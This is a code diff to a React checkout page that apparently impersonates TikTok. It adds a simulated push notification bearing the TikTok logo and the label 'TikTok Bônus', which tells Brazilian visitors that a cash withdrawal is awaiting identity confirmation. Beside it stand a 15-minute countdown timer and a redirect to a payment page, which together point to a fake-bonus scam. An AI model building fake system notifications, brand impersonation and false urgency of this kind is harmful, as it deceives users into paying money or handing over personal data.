@@ -19,6 +19,8 @@ const Checkout = () => {
   const today = new Date().toLocaleDateString("pt-BR");
 
   const [countdown, setCountdown] = useState(15 * 60);
+  const [showNotification, setShowNotification] = useState(false);
+  const [dismissNotification, setDismissNotification] = useState(false);
 
   useEffect(() => {
     trackTikTokEvent({ event: "InitiateCheckout", properties: { value: TARGET, currency: "BRL" } });
@@ -31,6 +33,20 @@ const Checkout = () => {
     return () => clearInterval(interval);
   }, []);
 
+  // Show push notification after 3 seconds
+  useEffect(() => {
+    const timer = setTimeout(() => setShowNotification(true), 3000);
+    return () => clearTimeout(timer);
+  }, []);
+
+  // Auto-dismiss after 6 seconds
+  useEffect(() => {
+    if (showNotification) {
+      const timer = setTimeout(() => setDismissNotification(true), 6000);
+      return () => clearTimeout(timer);
+    }
+  }, [showNotification]);
+
   const mins = Math.floor(countdown / 60);
   const secs = countdown % 60;
   const pad = (n: number) => String(n).padStart(2, "0");
@@ -41,8 +57,39 @@ const Checkout = () => {
     navigate("/pagamento");
   };
 
+  const now = new Date();
+  const notifTime = `${pad(now.getHours())}:${pad(now.getMinutes())}`;
+
   return (
-    <div className="flex min-h-screen flex-col bg-white">
+    <div className="flex min-h-screen flex-col bg-white relative">
+      {/* Simulated Push Notification */}
+      {showNotification && !dismissNotification && (
+        <div
+          className="fixed top-3 left-3 right-3 z-[9999] animate-fade-in cursor-pointer"
+          onClick={() => setDismissNotification(true)}
+          style={{ animation: "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)" }}
+        >
+          <div className="rounded-2xl bg-white/95 backdrop-blur-xl shadow-[0_8px_32px_rgba(0,0,0,0.12)] border border-gray-100/50 p-3.5 mx-auto max-w-md">
+            <div className="flex items-start gap-3">
+              <img
+                src={tiktokLogo}
+                alt="TikTok"
+                className="h-10 w-10 rounded-xl object-contain bg-black p-1.5 shrink-0"
+              />
+              <div className="flex-1 min-w-0">
+                <div className="flex items-center justify-between mb-0.5">
+                  <span className="text-xs font-semibold text-gray-900 uppercase tracking-wide">TikTok Bônus</span>
+                  <span className="text-[10px] text-gray-400">{notifTime}</span>
+                </div>
+                <p className="text-sm font-semibold text-gray-900 leading-tight">Saque pendente 💰</p>
+                <p className="text-xs text-gray-500 leading-snug mt-0.5">
+                  Seu saque de R$ {TARGET.toFixed(2).replace(".", ",")} está aguardando confirmação de identidade.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
       {/* Logo */}
       <div className="flex justify-center py-6">
         <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
